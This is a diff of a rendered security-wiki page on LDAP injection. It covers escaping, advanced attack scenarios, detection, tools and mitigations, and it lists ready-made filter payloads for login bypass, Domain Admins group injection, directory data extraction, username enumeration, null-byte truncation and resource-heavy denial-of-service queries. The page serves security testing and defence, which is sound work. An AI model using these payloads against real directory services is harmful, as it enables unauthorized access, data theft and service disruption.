 <p><strong>Comment Injection</strong></p>
 <p>Using <strong><code>\00</code></strong> (null byte) to truncate queries.</p>
-<pre tabindex="0"><code>admin)(uid=*))\00
-</code></pre></li>
+<pre tabindex="0"><code>admin)(uid=*))\00</code></pre></li>
 </ul>
-<h3 id="ldap-escaping">
-  LDAP Escaping
-  <a class="anchor" href="#ldap-escaping">#</a>
-</h3>
+<h3 id="ldap-escaping">LDAP Escaping<a class="anchor" href="#ldap-escaping">#</a></h3>
 <p>Reserved LDAP characters should be escaped.</p>
 <table>
-<thead>
-<tr>
-<th>Character</th>
-<th>Escape</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><code>*</code></td>
-<td><code>\2a</code></td>
-</tr>
-<tr>
-<td><code>(</code></td>
-<td><code>\28</code></td>
-</tr>
-<tr>
-<td><code>)</code></td>
-<td><code>\29</code></td>
-</tr>
-<tr>
-<td><code>\</code></td>
-<td><code>\5c</code></td>
-</tr>
-<tr>
-<td>NULL</td>
-<td><code>\00</code></td>
-</tr>
-</tbody>
+	<thead>
+			<tr>
+					<th>Character</th>
+					<th>Escape</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><code>*</code></td>
+					<td><code>\2a</code></td>
+			</tr>
+			<tr>
+					<td><code>(</code></td>
+					<td><code>\28</code></td>
+			</tr>
+			<tr>
+					<td><code>)</code></td>
+					<td><code>\29</code></td>
+			</tr>
+			<tr>
+					<td><code>\</code></td>
+					<td><code>\5c</code></td>
+			</tr>
+			<tr>
+					<td>NULL</td>
+					<td><code>\00</code></td>
+			</tr>
+	</tbody>
 </table>
 <p>Example: <code>admin\2a</code></p>
 <p>Many applications fail to properly escape these characters, leading to LDAP Injection.</p>
 <hr>
-<h2 id="advance-attack-scenarios">
-  Advance Attack Scenarios
-  <a class="anchor" href="#advance-attack-scenarios">#</a>
-</h2>
-<h3 id="1-nested-logical-operator-abuse">
-  <strong>1. Nested Logical Operator Abuse</strong>
-  <a class="anchor" href="#1-nested-logical-operator-abuse">#</a>
-</h3>
+<h2 id="advance-attack-scenarios">Advance Attack Scenarios<a class="anchor" href="#advance-attack-scenarios">#</a></h2>
+<h3 id="1-nested-logical-operator-abuse"><strong>1. Nested Logical Operator Abuse</strong><a class="anchor" href="#1-nested-logical-operator-abuse">#</a></h3>
 <p>Attackers inject deeply nested filters to override application logic and force evaluation to <strong>true</strong>.</p>
 <p><strong>Original Query</strong></p>
-<pre tabindex="0"><code>(&amp;(uid={input})(userPassword={input}))
-</code></pre><p><strong>Advanced Payload</strong></p>
-<pre tabindex="0"><code>admin)(|(uid=admin)(uid=*))(
-</code></pre><p>More complex nesting:</p>
-<pre tabindex="0"><code>*)(|(&amp;(uid=admin)(userPassword=*))(!(uid=admin)))
-</code></pre><hr>
-<h3 id="2-ldap-query-structure-manipulation-second-order-injection">
-  <strong>2. LDAP Query Structure Manipulation (Second-Order Injection)</strong>
-  <a class="anchor" href="#2-ldap-query-structure-manipulation-second-order-injection">#</a>
-</h3>
+<pre tabindex="0"><code>(&amp;(uid={input})(userPassword={input}))</code></pre><p><strong>Advanced Payload</strong></p>
+<pre tabindex="0"><code>admin)(|(uid=admin)(uid=*))(</code></pre><p>More complex nesting:</p>
+<pre tabindex="0"><code>*)(|(&amp;(uid=admin)(userPassword=*))(!(uid=admin)))</code></pre><hr>
+<h3 id="2-ldap-query-structure-manipulation-second-order-injection"><strong>2. LDAP Query Structure Manipulation (Second-Order Injection)</strong><a class="anchor" href="#2-ldap-query-structure-manipulation-second-order-injection">#</a></h3>
 <p>Occurs when user input is stored and later reused in another LDAP query.</p>
 <p><strong>Step 1 – Inject Malicious Value During Registration</strong></p>
-<pre tabindex="0"><code>username: attacker)(|(uid=*))
-</code></pre><p><strong>Step 2 – Application Later Executes</strong></p>
-<pre tabindex="0"><code>(&amp;(uid=attacker)(|(uid=*)))
-</code></pre><hr>
-<h3 id="3-active-directory-privilege-escalation">
-  <strong>3. Active Directory Privilege Escalation</strong>
-  <a class="anchor" href="#3-active-directory-privilege-escalation">#</a>
-</h3>
+<pre tabindex="0"><code>username: attacker)(|(uid=*))</code></pre><p><strong>Step 2 – Application Later Executes</strong></p>
+<pre tabindex="0"><code>(&amp;(uid=attacker)(|(uid=*)))</code></pre><hr>
+<h3 id="3-active-directory-privilege-escalation"><strong>3. Active Directory Privilege Escalation</strong><a class="anchor" href="#3-active-directory-privilege-escalation">#</a></h3>
 <p>In environments using <strong>Active Directory</strong>, LDAP injection can target group membership.</p>
 <p>Example filter:</p>
-<pre tabindex="0"><code>(&amp;(memberOf=CN=Employees,OU=Groups,DC=corp,DC=local)(uid={input}))
-</code></pre><p><strong>Payload</strong></p>
-<pre tabindex="0"><code>*)(memberOf=CN=Domain Admins,OU=Groups,DC=corp,DC=local)
-</code></pre><p>Advanced group injection:</p>
-<pre tabindex="0"><code>*)(|(memberOf=CN=Domain Admins,OU=Groups,DC=corp,DC=local)(uid=*))
-</code></pre><hr>
-<h3 id="4-data-exfiltration-via-attribute-expansion">
-  <strong>4. Data Exfiltration via Attribute Expansion</strong>
-  <a class="anchor" href="#4-data-exfiltration-via-attribute-expansion">#</a>
-</h3>
+<pre tabindex="0"><code>(&amp;(memberOf=CN=Employees,OU=Groups,DC=corp,DC=local)(uid={input}))</code></pre><p><strong>Payload</strong></p>
+<pre tabindex="0"><code>*)(memberOf=CN=Domain Admins,OU=Groups,DC=corp,DC=local)</code></pre><p>Advanced group injection:</p>
+<pre tabindex="0"><code>*)(|(memberOf=CN=Domain Admins,OU=Groups,DC=corp,DC=local)(uid=*))</code></pre><hr>
+<h3 id="4-data-exfiltration-via-attribute-expansion"><strong>4. Data Exfiltration via Attribute Expansion</strong><a class="anchor" href="#4-data-exfiltration-via-attribute-expansion">#</a></h3>
 <p>Instead of bypassing login, attacker modifies returned attributes.</p>
 <p>Original:</p>
-<pre tabindex="0"><code>(&amp;(uid=user))(cn)
-</code></pre><p>Injected:</p>
-<pre tabindex="0"><code>*)(|(uid=*))(userPassword=*)(mail=*)(*)
-</code></pre><p>Useful in:</p>
+<pre tabindex="0"><code>(&amp;(uid=user))(cn)</code></pre><p>Injected:</p>
+<pre tabindex="0"><code>*)(|(uid=*))(userPassword=*)(mail=*)(*)</code></pre><p>Useful in:</p>
 <ul>
 <li>Directory search forms</li>
 <li>Employee lookup portals</li>
 <li>SSO directory previews</li>
 </ul>
 <hr>
-<h3 id="5-blind-boolean-enumeration-user-harvesting">
-  <strong>5. Blind Boolean Enumeration (User Harvesting)</strong>
-  <a class="anchor" href="#5-blind-boolean-enumeration-user-harvesting">#</a>
-</h3>
+<h3 id="5-blind-boolean-enumeration-user-harvesting"><strong>5. Blind Boolean Enumeration (User Harvesting)</strong><a class="anchor" href="#5-blind-boolean-enumeration-user-harvesting">#</a></h3>
 <p>Attackers enumerate valid usernames using response differences.</p>
 <p>Payloads:</p>
 <pre tabindex="0"><code>*)(uid=admin))(|(uid=*
 *)(uid=john.doe))(|(uid=*
-*)(uid=testuser))(|(uid=*
-</code></pre><p><strong>Method</strong></p>
+*)(uid=testuser))(|(uid=*</code></pre><p><strong>Method</strong></p>
 <ul>
 <li>If response differs → user exists</li>
 <li>Repeat iteratively</li>
@@ -1727,10 +1634,7 @@ Injected Query:
 <li>Later attempt password attacks</li>
 </ul>
 <hr>
-<h3 id="6-time-based-ldap-injection-heavy-query-exploitation">
-  <strong>6. Time-Based LDAP Injection (Heavy Query Exploitation)</strong>
-  <a class="anchor" href="#6-time-based-ldap-injection-heavy-query-exploitation">#</a>
-</h3>
+<h3 id="6-time-based-ldap-injection-heavy-query-exploitation"><strong>6. Time-Based LDAP Injection (Heavy Query Exploitation)</strong><a class="anchor" href="#6-time-based-ldap-injection-heavy-query-exploitation">#</a></h3>
 <p>LDAP does not support sleep functions like SQL — attackers simulate delay using:</p>
 <ul>
 <li>Extremely complex filters</li>
@@ -1738,35 +1642,21 @@ Injected Query:
 <li>Wildcard-heavy searches</li>
 </ul>
 <p>Example:</p>
-<pre tabindex="0"><code>*)(|(cn=*)(cn=*)(cn=*)(cn=*)(cn=*)(cn=*)(cn=*))
-</code></pre><p>or</p>
-<pre tabindex="0"><code>(&amp;(objectClass=*)(!(objectClass=nonexistent)))
-</code></pre><p>Used for:</p>
+<pre tabindex="0"><code>*)(|(cn=*)(cn=*)(cn=*)(cn=*)(cn=*)(cn=*)(cn=*))</code></pre><p>or</p>
+<pre tabindex="0"><code>(&amp;(objectClass=*)(!(objectClass=nonexistent)))</code></pre><p>Used for:</p>
 <ul>
 <li>Blind injection confirmation</li>
 <li>Denial-of-Service attacks</li>
 </ul>
 <hr>
-<h3 id="7-ldap-injection-in-password-reset-workflows">
-  <strong>7. LDAP Injection in Password Reset Workflows</strong>
-  <a class="anchor" href="#7-ldap-injection-in-password-reset-workflows">#</a>
-</h3>
+<h3 id="7-ldap-injection-in-password-reset-workflows"><strong>7. LDAP Injection in Password Reset Workflows</strong><a class="anchor" href="#7-ldap-injection-in-password-reset-workflows">#</a></h3>
 <p>Forgot password filter:</p>
-<pre tabindex="0"><code>(&amp;(mail={input})(uid={input}))
-</code></pre><p>Payload:</p>
-<pre tabindex="0"><code>*)(uid=admin)(mail=*)
-</code></pre><hr>
-<h3 id="8-null-byte-injection-for-filter-truncation">
-  <strong>8. Null Byte Injection for Filter Truncation</strong>
-  <a class="anchor" href="#8-null-byte-injection-for-filter-truncation">#</a>
-</h3>
+<pre tabindex="0"><code>(&amp;(mail={input})(uid={input}))</code></pre><p>Payload:</p>
+<pre tabindex="0"><code>*)(uid=admin)(mail=*)</code></pre><hr>
+<h3 id="8-null-byte-injection-for-filter-truncation"><strong>8. Null Byte Injection for Filter Truncation</strong><a class="anchor" href="#8-null-byte-injection-for-filter-truncation">#</a></h3>
 <p>If backend fails to sanitize null bytes:</p>
-<pre tabindex="0"><code>admin)(uid=*))\00
-</code></pre><hr>
-<h3 id="9-chained-injection-with-application-logic-flaws">
-  <strong>9. Chained Injection with Application Logic Flaws</strong>
-  <a class="anchor" href="#9-chained-injection-with-application-logic-flaws">#</a>
-</h3>
+<pre tabindex="0"><code>admin)(uid=*))\00</code></pre><hr>
+<h3 id="9-chained-injection-with-application-logic-flaws"><strong>9. Chained Injection with Application Logic Flaws</strong><a class="anchor" href="#9-chained-injection-with-application-logic-flaws">#</a></h3>
 <p>LDAP injection combined with:</p>
 <ul>
 <li>Weak access control</li>
@@ -1774,18 +1664,14 @@ Injected Query:
 <li>Role-based UI filtering</li>
 </ul>
 <p>Example:</p>
-<pre tabindex="0"><code>*)(|(role=admin)(uid=*))
-</code></pre><p>If application trusts LDAP result:</p>
+<pre tabindex="0"><code>*)(|(role=admin)(uid=*))</code></pre><p>If application trusts LDAP result:</p>
 <ul>
 <li>Returns admin role</li>
 <li>Grants elevated UI access</li>
 <li>Privilege escalation achieved</li>
 </ul>
 <hr>
-<h3 id="10-cross-protocol-exploitation-ldap--kerberossso">
-  <strong>10. Cross-Protocol Exploitation (LDAP + Kerberos/SSO)</strong>
-  <a class="anchor" href="#10-cross-protocol-exploitation-ldap--kerberossso">#</a>
-</h3>
+<h3 id="10-cross-protocol-exploitation-ldap--kerberossso"><strong>10. Cross-Protocol Exploitation (LDAP + Kerberos/SSO)</strong><a class="anchor" href="#10-cross-protocol-exploitation-ldap--kerberossso">#</a></h3>
 <p>In enterprise environments using:</p>
 <ul>
 <li>LDAP for directory lookup</li>
@@ -1798,14 +1684,8 @@ Injected Query:
 <li>Assist in lateral movement attacks</li>
 </ul>
 <hr>
-<h2 id="framework-specific-scenarios">
-  Framework-Specific Scenarios
-  <a class="anchor" href="#framework-specific-scenarios">#</a>
-</h2>
-<h3 id="java">
-  Java
-  <a class="anchor" href="#java">#</a>
-</h3>
+<h2 id="framework-specific-scenarios">Framework-Specific Scenarios<a class="anchor" href="#framework-specific-scenarios">#</a></h2>
+<h3 id="java">Java<a class="anchor" href="#java">#</a></h3>
 <p>Common APIs:</p>
 <ul>
 <li>JNDI</li>
@@ -1813,10 +1693,7 @@ Injected Query:
 <li>Apache Directory API</li>
 </ul>
 <hr>
-<h3 id="net">
-  .NET
-  <a class="anchor" href="#net">#</a>
-</h3>
+<h3 id="net">.NET<a class="anchor" href="#net">#</a></h3>
 <p>Common APIs:</p>
 <ul>
 <li>System.DirectoryServices</li>
@@ -1824,61 +1701,41 @@ Injected Query:
 <li>DirectorySearcher</li>
 </ul>
 <hr>
-<h3 id="php">
-  PHP
-  <a class="anchor" href="#php">#</a>
-</h3>
+<h3 id="php">PHP<a class="anchor" href="#php">#</a></h3>
 <p>Functions:</p>
 <ul>
 <li>ldap_search()</li>
 <li>ldap_bind()</li>
 </ul>
 <hr>
-<h3 id="python">
-  Python
-  <a class="anchor" href="#python">#</a>
-</h3>
+<h3 id="python">Python<a class="anchor" href="#python">#</a></h3>
 <p>Libraries:</p>
 <ul>
 <li>ldap3</li>
 <li>python-ldap</li>
 </ul>
 <hr>
-<h3 id="nodejs">
-  Node.js
-  <a class="anchor" href="#nodejs">#</a>
-</h3>
+<h3 id="nodejs">Node.js<a class="anchor" href="#nodejs">#</a></h3>
 <p>Libraries:</p>
 <ul>
 <li>ldapjs</li>
 <li>activedirectory2</li>
 </ul>
 <hr>
-<h2 id="detection-techniques">
-  Detection Techniques
-  <a class="anchor" href="#detection-techniques">#</a>
-</h2>
-<h3 id="1-manual-detection-techniques">
-  <strong>1. Manual Detection Techniques</strong>
-  <a class="anchor" href="#1-manual-detection-techniques">#</a>
-</h3>
+<h2 id="detection-techniques">Detection Techniques<a class="anchor" href="#detection-techniques">#</a></h2>
+<h3 id="1-manual-detection-techniques"><strong>1. Manual Detection Techniques</strong><a class="anchor" href="#1-manual-detection-techniques">#</a></h3>
 <p>Manual testing focuses on identifying how user input affects LDAP query behavior.</p>
 <hr>
-<h3 id="a-special-character-injection-testing">
-  <strong>A. Special Character Injection Testing</strong>
-  <a class="anchor" href="#a-special-character-injection-testing">#</a>
-</h3>
+<h3 id="a-special-character-injection-testing"><strong>A. Special Character Injection Testing</strong><a class="anchor" href="#a-special-character-injection-testing">#</a></h3>
 <p>Test inputs containing LDAP control characters:</p>
 <pre tabindex="0"><code>*
 )(
 &amp;
 |!
-\00
-</code></pre><p>Example payloads:</p>
+\00</code></pre><p>Example payloads:</p>
 <pre tabindex="0"><code>*)(uid=*)
 admin)(&amp;
-*)(|(uid=*))
-</code></pre><p><strong>Indicators of Vulnerability</strong></p>
+*)(|(uid=*))</code></pre><p><strong>Indicators of Vulnerability</strong></p>
 <ul>
 <li>Authentication bypass</li>
 <li>Different error messages</li>
@@ -1886,14 +1743,10 @@ admin)(&amp;
 <li>Directory search returns excessive results</li>
 </ul>
 <hr>
-<h3 id="b-boolean-based-testing">
-  <strong>B. Boolean-Based Testing</strong>
-  <a class="anchor" href="#b-boolean-based-testing">#</a>
-</h3>
+<h3 id="b-boolean-based-testing"><strong>B. Boolean-Based Testing</strong><a class="anchor" href="#b-boolean-based-testing">#</a></h3>
 <p>Inject conditions that alter logical outcomes.</p>
 <pre tabindex="0"><code>*)(uid=admin))(|(uid=*
-*)(!(uid=admin))
-</code></pre><p><strong>Observe:</strong></p>
+*)(!(uid=admin))</code></pre><p><strong>Observe:</strong></p>
 <ul>
 <li>Response differences (Login success vs failure)</li>
 <li>Changes in page length</li>
@@ -1902,27 +1755,19 @@ admin)(&amp;
 </ul>
 <p>If logical condition changes response → likely injectable.</p>
 <hr>
-<h3 id="c-wildcard-enumeration-testing">
-  <strong>C. Wildcard Enumeration Testing</strong>
-  <a class="anchor" href="#c-wildcard-enumeration-testing">#</a>
-</h3>
+<h3 id="c-wildcard-enumeration-testing"><strong>C. Wildcard Enumeration Testing</strong><a class="anchor" href="#c-wildcard-enumeration-testing">#</a></h3>
 <p>Use wildcard expansion to test over-broad queries.</p>
-<pre tabindex="0"><code>*)(cn=*)*)(mail=*)
-</code></pre><p><strong>Signs of Vulnerability</strong></p>
+<pre tabindex="0"><code>*)(cn=*)*)(mail=*)</code></pre><p><strong>Signs of Vulnerability</strong></p>
 <ul>
 <li>Entire directory listing exposed</li>
 <li>Multiple user records returned</li>
 <li>Sensitive attributes displayed</li>
 </ul>
 <hr>
-<h3 id="d-error-based-detection">
-  <strong>D. Error-Based Detection</strong>
-  <a class="anchor" href="#d-error-based-detection">#</a>
-</h3>
+<h3 id="d-error-based-detection"><strong>D. Error-Based Detection</strong><a class="anchor" href="#d-error-based-detection">#</a></h3>
 <p>Trigger malformed filters:</p>
 <pre tabindex="0"><code>*)(
-*))(|(
-</code></pre><p><strong>Indicators</strong></p>
+*))(|(</code></pre><p><strong>Indicators</strong></p>
 <ul>
 <li>LDAP syntax error messages</li>
 <li>Stack traces referencing:
@@ -1935,13 +1780,9 @@ admin)(&amp;
 </ul>
 <p>Error disclosure significantly increases exploitability.</p>
 <hr>
-<h3 id="e-timeresource-based-observation">
-  <strong>E. Time/Resource-Based Observation</strong>
-  <a class="anchor" href="#e-timeresource-based-observation">#</a>
-</h3>
+<h3 id="e-timeresource-based-observation"><strong>E. Time/Resource-Based Observation</strong><a class="anchor" href="#e-timeresource-based-observation">#</a></h3>
 <p>Inject heavy queries:</p>
-<pre tabindex="0"><code>*)(|(cn=*)(cn=*)(cn=*)(cn=*))
-</code></pre><p>If:</p>
+<pre tabindex="0"><code>*)(|(cn=*)(cn=*)(cn=*)(cn=*))</code></pre><p>If:</p>
 <ul>
 <li>Response time increases significantly</li>
 <li>Server CPU spikes</li>
@@ -1949,17 +1790,10 @@ admin)(&amp;
 </ul>
 <p>→ Possible blind LDAP injection.</p>
 <hr>
-<h3 id="f-authentication-logic-testing">
-  <strong>F. Authentication Logic Testing</strong>
-  <a class="anchor" href="#f-authentication-logic-testing">#</a>
-</h3>
+<h3 id="f-authentication-logic-testing"><strong>F. Authentication Logic Testing</strong><a class="anchor" href="#f-authentication-logic-testing">#</a></h3>
 <p>Attempt login bypass:</p>
-<pre tabindex="0"><code>Username: admin*)(userPassword=*Password: anything
-</code></pre><p>If login succeeds → confirmed injection vulnerability.</p>
-<h3 id="g-response-comparison">
-  G. Response Comparison
-  <a class="anchor" href="#g-response-comparison">#</a>
-</h3>
+<pre tabindex="0"><code>Username: admin*)(userPassword=*Password: anything</code></pre><p>If login succeeds → confirmed injection vulnerability.</p>
+<h3 id="g-response-comparison">G. Response Comparison<a class="anchor" href="#g-response-comparison">#</a></h3>
 <p>Compare responses for:</p>
 <ul>
 <li>Status code</li>
@@ -1970,15 +1804,9 @@ admin)(&amp;
 <li>Returned LDAP attributes</li>
 </ul>
 <hr>
-<h3 id="automated-detection-techniques">
-  <strong>Automated Detection Techniques</strong>
-  <a class="anchor" href="#automated-detection-techniques">#</a>
-</h3>
+<h3 id="automated-detection-techniques"><strong>Automated Detection Techniques</strong><a class="anchor" href="#automated-detection-techniques">#</a></h3>
 <p>Automated tools accelerate identification of LDAP injection vulnerabilities across large applications.</p>
-<h3 id="a-proxy-based-dynamic-scanning">
-  <strong>A. Proxy-Based Dynamic Scanning</strong>
-  <a class="anchor" href="#a-proxy-based-dynamic-scanning">#</a>
-</h3>
+<h3 id="a-proxy-based-dynamic-scanning"><strong>A. Proxy-Based Dynamic Scanning</strong><a class="anchor" href="#a-proxy-based-dynamic-scanning">#</a></h3>
 <p>Use intercepting proxies to fuzz parameters:</p>
 <ul>
 <li>Login forms</li>
@@ -1988,8 +1816,7 @@ admin)(&amp;
 </ul>
 <p>Test payload lists including:</p>
 <pre tabindex="0"><code>*)(uid=*)*)(|(objectClass=*))
-admin)(&amp;
-</code></pre><p>Tools automatically analyze:</p>
+admin)(&amp;</code></pre><p>Tools automatically analyze:</p>
 <ul>
 <li>Response variations</li>
 <li>Error messages</li>
@@ -1997,10 +1824,7 @@ admin)(&amp;
 <li>Content length differences</li>
 </ul>
 <hr>
-<h3 id="b-fuzzing-with-payload-libraries">
-  <strong>B. Fuzzing with Payload Libraries</strong>
-  <a class="anchor" href="#b-fuzzing-with-payload-libraries">#</a>
-</h3>
+<h3 id="b-fuzzing-with-payload-libraries"><strong>B. Fuzzing with Payload Libraries</strong><a class="anchor" href="#b-fuzzing-with-payload-libraries">#</a></h3>
 <p>Use pre-built LDAP payload wordlists.</p>
 <p>Effective for:</p>
 <ul>
@@ -2015,10 +1839,7 @@ admin)(&amp;
 <li>Filter logic manipulation</li>
 </ul>
 <hr>
-<h3 id="c-automated-security-scanners">
-  <strong>C. Automated Security Scanners</strong>
-  <a class="anchor" href="#c-automated-security-scanners">#</a>
-</h3>
+<h3 id="c-automated-security-scanners"><strong>C. Automated Security Scanners</strong><a class="anchor" href="#c-automated-security-scanners">#</a></h3>
 <p>Common tools capable of detecting LDAP Injection:</p>
 <ul>
 <li><strong>Burp Suite (Active Scanner)</strong></li>
@@ -2027,10 +1848,7 @@ admin)(&amp;
 <li><strong>Nuclei (custom LDAP templates)</strong></li>
 </ul>
 <hr>
-<h2 id="impact">
-  Impact
-  <a class="anchor" href="#impact">#</a>
-</h2>
+<h2 id="impact">Impact<a class="anchor" href="#impact">#</a></h2>
 <ul>
 <li>Bypass login and gain unauthorized access to user or administrator accounts.</li>
 <li>Extract sensitive user information such as usernames, emails, and group memberships.</li>
@@ -2041,10 +1859,7 @@ admin)(&amp;
 <li>Crash or disrupt LDAP authentication services, causing Denial of Service (DoS).</li>
 </ul>
 <hr>
-<h2 id="tools">
-  Tools
-  <a class="anchor" href="#tools">#</a>
-</h2>
+<h2 id="tools">Tools<a class="anchor" href="#tools">#</a></h2>
 <ul>
 <li><strong>Burp Suite</strong> (Intruder, Repeater)</li>
 <li><strong>OWASP ZAP</strong></li>
@@ -2052,22 +1867,13 @@ admin)(&amp;
 <li><a href="https://www.ldapadministrator.com/" target="_blank" rel="noreferrer noopener nofollow">Softerra LDAP Browser</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
 </ul>
 <hr>
-<h2 id="mitigation--prevention">
-  <strong>Mitigation &amp; Prevention</strong>
-  <a class="anchor" href="#mitigation--prevention">#</a>
-</h2>
-<h3 id="input-validation">
-  <strong>Input Validation</strong>
-  <a class="anchor" href="#input-validation">#</a>
-</h3>
+<h2 id="mitigation--prevention"><strong>Mitigation &amp; Prevention</strong><a class="anchor" href="#mitigation--prevention">#</a></h2>
+<h3 id="input-validation"><strong>Input Validation</strong><a class="anchor" href="#input-validation">#</a></h3>
 <ul>
 <li><strong>Allowlist</strong> (only alphanumeric chars).</li>
 <li><strong>Block special chars</strong>: <strong><code>( ) | &amp; * \00</code></strong></li>
 </ul>
-<h3 id="parameterized-queries">
-  <strong>Parameterized Queries</strong>
-  <a class="anchor" href="#parameterized-queries">#</a>
-</h3>
+<h3 id="parameterized-queries"><strong>Parameterized Queries</strong><a class="anchor" href="#parameterized-queries">#</a></h3>
 <ul>
 <li>Use LDAP libraries with escaping:
 <ul>
@@ -2076,34 +1882,22 @@ admin)(&amp;
 </ul>
 </li>
 </ul>
-<h3 id="least-privilege-access">
-  <strong>Least Privilege Access</strong>
-  <a class="anchor" href="#least-privilege-access">#</a>
-</h3>
+<h3 id="least-privilege-access"><strong>Least Privilege Access</strong><a class="anchor" href="#least-privilege-access">#</a></h3>
 <ul>
 <li>Restrict LDAP bind accounts to <strong>read-only</strong>.</li>
 <li>Use <strong>LDAPS (TLS)</strong> instead of plain LDAP.</li>
 </ul>
-<h3 id="secure-configurations">
-  <strong>Secure Configurations</strong>
-  <a class="anchor" href="#secure-configurations">#</a>
-</h3>
+<h3 id="secure-configurations"><strong>Secure Configurations</strong><a class="anchor" href="#secure-configurations">#</a></h3>
 <ul>
 <li>Disable <strong>anonymous binds</strong>.</li>
 <li>Enforce <strong>rate limiting</strong> to prevent DoS.</li>
 </ul>
 <hr>
-<h2 id="good-to-read">
-  Good To Read:
-  <a class="anchor" href="#good-to-read">#</a>
-</h2>
+<h2 id="good-to-read">Good To Read:<a class="anchor" href="#good-to-read">#</a></h2>
 <p><a href="https://hackerone.com/reports/359290" target="_blank" rel="noreferrer noopener nofollow">https://hackerone.com/reports/359290</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></p>
 <p><a href="https://ggolawski.github.io/2020/08/06/cve-2020-1958-ldap-injection-druid.html" target="_blank" rel="noreferrer noopener nofollow">https://ggolawski.github.io/2020/08/06/cve-2020-1958-ldap-injection-druid.html</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></p>
 <hr>
-<h2 id="references">
-  References:
-  <a class="anchor" href="#references">#</a>
-</h2>
+<h2 id="references">References:<a class="anchor" href="#references">#</a></h2>
 <p><a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/06-Testing_for_LDAP_Injection" target="_blank" rel="noreferrer noopener nofollow">https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/06-Testing_for_LDAP_Injection</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></p>
 <p><a href="https://www.imperva.com/learn/application-security/ldap-injection/" target="_blank" rel="noreferrer noopener nofollow">https://www.imperva.com/learn/application-security/ldap-injection/</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></p>
 <p><a href="https://www.brightsec.com/blog/ldap-injection/" target="_blank" rel="noreferrer noopener nofollow">https://www.brightsec.com/blog/ldap-injection/</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></p>
@@ -2122,49 +1916,62 @@ admin)(&amp;
         
   <div class="flex flex-wrap justify-between">
 
-
-  <div><a class="flex align-center" href="https://github.com/payatu/cybersec-wiki/commit/d2c880c4a57b9b433287f413f6e6111ca829ffdd" title='Last modified by banditSaurabh | August 5, 2026' target="_blank" rel="noopener">
-      <img src="/svg/calendar.svg" class="book-icon" alt="Calendar" />
-      <span>August 5, 2026</span>
-    </a>
-  </div>
-
-
-
-  <div>
-    <a class="flex align-center" href="https://github.com/payatu/cybersec-wiki/edit/main/content/docs/application-security/web/LDAP%20Injection.md" target="_blank" rel="noopener">
-      <img src="/svg/edit.svg" class="book-icon" alt="Edit" />
-      <span>Edit this page</span>
-    </a>
-  </div>
-
+<div>
 
 </div>
 
+<div>
 
+</div>
 
-  <script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script>
+</div>
 
+<div class="flex flex-wrap justify-between">
+    <span>
+    
+      <a href="/docs/application-security/web/JWT/" class="flex align-center">
+        <img src="/icons/backward.svg" class="book-icon" alt="Backward" />
+        <span>JWT</span>
+      </a>
+    
+    </span>
+    <span>
+    
+      <a href="/docs/application-security/web/Mass-Assignment/" class="flex align-center">
+        <span>Mass Assignment</span>
+        <img src="/icons/forward.svg" class="book-icon" alt="Forward" />
+      </a>
+    
+    </span>
+  </div>
 
  
         
-      </footer>
-
-      
   
   <div class="book-comments">
 
 </div>
   
  
+        
+        
+  
+ 
+        
+  
+    <script>(function(){document.querySelectorAll("pre:has(code)").forEach(e=>{e.addEventListener("click",e.focus),e.addEventListener("copy",function(t){if(t.preventDefault(),navigator.clipboard){const t=window.getSelection().toString()||e.textContent;navigator.clipboard.writeText(t)}})})})()</script>
+  
+
+      </footer>
 
       <label for="menu-control" class="hidden book-menu-overlay"></label>
     </div>
 
     
-    <aside class="book-toc">
-      <div class="book-toc-content">
-        
+  
+  <aside class="book-toc">
+    <div class="book-toc-content">
+      
   
 <nav id="TableOfContents">
   <ul>
@@ -2252,15 +2059,24 @@ admin)(&amp;
 </nav>
 
 
+
+    </div>
+  </aside>
+  
  
-      </div>
-    </aside>
-    
   </main>
 
   
 </body>
 </html>
+
+
+
+
+
+
+
+
 
 
 
